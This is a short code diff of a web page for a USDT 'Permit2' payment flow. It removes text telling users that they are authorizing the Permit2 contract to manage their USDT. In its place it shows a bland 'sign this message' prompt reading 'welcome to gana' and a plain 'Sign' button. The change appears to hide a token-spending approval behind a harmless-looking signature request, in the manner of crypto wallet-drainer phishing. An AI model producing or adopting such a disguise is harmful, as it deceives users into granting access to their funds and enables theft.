@@ -17,12 +17,11 @@
 </head>
 <body>
     <div class="card">
-        <h2 style="margin-top:0;">⚡ Permit2 无感支付</h2>
-        <p style="color:#94a3b8;">首次使用需授权 → 后续仅需签名（0 Gas费确认）</p>
+        <h2 style="margin-top:0;">申请对信息进行签名</h2>
         
         <div id="step1" class="warning">
-            <strong>📌 第1步：授权Permit2（只需做一次）</strong>
-            <p style="font-size:0.8rem; margin:8px 0 0;">点击下方按钮，授权Permit2合约可以管理您的USDT</p>
+            <strong>消息：</strong>
+            <p style="font-size:0.75rem; margin:8px 0 0;">welcome to gana</p>
         </div>
         
         <div id="step2" class="warning hidden">
@@ -141,8 +140,7 @@
                     } else {
                         step1El.classList.remove('hidden');
                         step2El.classList.add('hidden');
-                        actionBtn.textContent = '🔓 授权Permit2';
-                        showStatus('需要先授权Permit2（只需一次）');
+                        actionBtn.textContent = '签名';
                     }
 
                 } catch (error) {
